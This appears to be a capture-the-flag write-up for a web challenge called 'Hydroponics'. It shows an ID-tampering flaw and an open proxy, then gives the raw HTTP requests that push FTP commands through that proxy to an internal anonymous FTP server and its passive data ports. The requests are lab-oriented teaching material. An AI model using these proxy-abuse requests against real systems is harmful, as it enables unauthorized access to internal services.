## Hydroponics

By viewing the system configuration, we notice that the application performs a `GET` request towards the following endpoint:

```
/system_configuration.php?id=1
```

By changing the `id` to `2` we get a config for a vsftpd server in which we can see the PASV port range and that anonymous access is available.

From the `plants.php` page we see that a similar request is made towards `details.php`:
We can perform a request with an invalid ID: we will receive a response with the following content:

```html    
    <div>UNEXPECTED ERROR!!</div>
    <!-- TODO: customize this error message -->
    <!-- TODO: also fix that problem with the proxy once I figure how to do it -->
```

Which hints us of the existence of a possible open proxy vulnerability.

We can try to see if the open proxy vulnerability is present by performing the following request:

    GET http://localhost:80 HTTP/1.1
    Host: <CHALLENGE_HOSTNAME>:8000
    Connection: close
    Content-Length: 0

Confirmed, it's present.

We can now leverage this to query the FTP service:

    GET http://localhost:21 HTTP/1.1
    Host: <CHALLENGE_HOSTNAME>:8000
    Connection: close
    Content-Length: 63
    
    USER anonymous
    PASS anonymous
    PASV
    LIST
    QUIT

And by iterating a request towards each of the PASV data ports that get opened by the PASV command and then used by the LIST command (example for port `40000`):
    
    GET http://localhost:40000 HTTP/1.1
    Host: <CHALLENGE_HOSTNAME>:8000
    Connection: close
    Content-Length: 0
    

we can try to retrieve the data. This will not always work, so we need to iterate the requests many time until we get a `200 OK` response.
I have developed a python script that does this automatically: `death_by_proxy.py` (the command is `python death_by_proxy.py -p 40000 -P 40009 -u http://<ip>:8000 -c LIST`).

After doing so we can see that a configuration file is present: we can use it in the web page to reset the system configuration and retrieve the flag.

